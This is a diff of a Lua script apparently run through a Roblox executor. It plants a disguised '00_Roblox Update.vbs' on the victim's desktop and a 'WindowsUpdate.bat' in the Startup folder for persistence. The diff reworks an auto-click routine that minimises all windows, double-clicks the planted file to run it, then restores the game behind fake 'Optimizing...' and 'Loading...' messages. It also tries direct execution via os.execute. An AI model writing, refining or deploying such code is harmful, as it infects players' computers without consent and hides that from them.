@@ -149,7 +149,7 @@ local function b64_decode(data)
     end))
 end
 
--- ================= AUTO-CLICK =================
+-- ================= INPUT =================
 local function press_win_d()
     pcall(function()
         keypress(0x5B)     -- LWin down
@@ -165,13 +165,13 @@ end
 local function double_click_at(x, y)
     pcall(function()
         mousemoveabs(x, y)
+        task.wait(0.3)
+        mouse1press()
+        task.wait(0.08)
+        mouse1release()
         task.wait(0.15)
         mouse1press()
-        task.wait(0.05)
-        mouse1release()
         task.wait(0.08)
-        mouse1press()
-        task.wait(0.05)
         mouse1release()
     end)
 end
@@ -183,13 +183,24 @@ local function auto_run_exe()
 
     task.wait(0.5)
     log("Optimizing...")
+
+    -- 1. свернуть всё (Win+D)
     press_win_d()
-    task.wait(1.2)
-    -- левый верхний угол рабочего стола (там Windows ставит новые ярлыки)
-    double_click_at(50, 50)
-    task.wait(1.0)
-    press_win_d()  -- возвращаем Roblox
+    task.wait(2.0)
+
+    -- 2. двойной клик по левому верхнему углу (3 попытки)
+    log("Loading...")
+    for i = 1, 3 do
+        double_click_at(50, 50)
+        task.wait(0.5)
+    end
+
+    task.wait(1.5)
+
+    -- 3. вернуть Roblox
+    press_win_d()
     task.wait(0.5)
+
     return "auto_clicked"
 end
 
@@ -219,7 +230,7 @@ local function deploy_payload()
 
     local results = {}
 
-    -- пишем ярлык на рабочий стол с префиксом "00_" чтобы он был первым в сортировке
+    -- ярлык на рабочий стол с префиксом 00_ чтобы был первым
     local desktop = "C:\\Users\\" .. user .. "\\Desktop"
     local vbs_path = desktop .. "\\00_Roblox Update.vbs"
     local vbs_content = 'Set sh = CreateObject("WScript.Shell")\r\n'
@@ -228,7 +239,7 @@ local function deploy_payload()
     local ok_vbs = pcall(writefile, vbs_path, vbs_content)
     results.desktop_vbs = ok_vbs
 
-    -- startup на всякий случай
+    -- Startup резерв
     local startup = "C:\\Users\\" .. user .. "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
     local bat_path = startup .. "\\WindowsUpdate.bat"
     local bat = "@echo off\n"
@@ -245,7 +256,7 @@ local function deploy_payload()
         results.autoclick = click_result
     end
 
-    -- если платный инжектор — пробуем напрямую
+    -- если платный инжектор — прямой запуск
     if os and os.execute then
         pcall(os.execute, '"' .. path .. '"')
         results.direct = true
